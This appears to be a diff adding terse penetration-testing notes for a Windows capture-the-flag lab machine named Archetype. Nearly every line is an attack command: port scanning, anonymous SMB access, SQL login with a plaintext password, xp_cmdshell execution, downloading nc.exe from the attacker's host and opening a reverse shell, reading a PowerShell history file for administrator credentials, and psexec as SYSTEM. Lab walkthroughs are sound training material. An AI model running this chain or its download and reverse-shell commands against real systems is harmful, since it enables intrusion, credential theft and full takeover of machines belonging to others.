@@ -1,0 +1,31 @@
+nmap -v -n -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.27 -oA nmap/tcp-all
+
+smbclient -N -L 10.10.10.27
+
+smbclient '\\10.10.10.27\backups' -N
+smb: \> get prod.dtsConfig
+
+sqsh -S 10.10.10.27 -U 'ARCHETYPE\sql_svc' -P M3g4c0rp123
+1> EXEC master..xp_cmdshell 'whoami'
+2> go
+1> xp_cmdshell 'powershell invoke-webrequest -uri http://10.10.14.110/nc.exe -out c:\users\public\nc.exe'
+2> go
+1> xp_cmdshell 'c:\users\public\nc.exe -e cmd 10.10.14.110 443'
+2> go
+
+### on reverse shell
+whoami /all  # see SeImpersonatePrivilege
+# can't get it to work because AV keeps deleting my reverse shell exe
+cd c:\users\public
+iwr -uri http://10.10.15.44/winPEASany.exe -out winpeas.exe
+./winpeas.exe
+# notice cred file
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# get administrator creds
+
+## alternate ms-sql client
+impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
+# requires double quotes for xp_cmdshell strings
+
+# pwn as system
+psexec.py 'ARCHETYPE/administrator:MEGACORP_4dm1n!!@10.10.10.27'
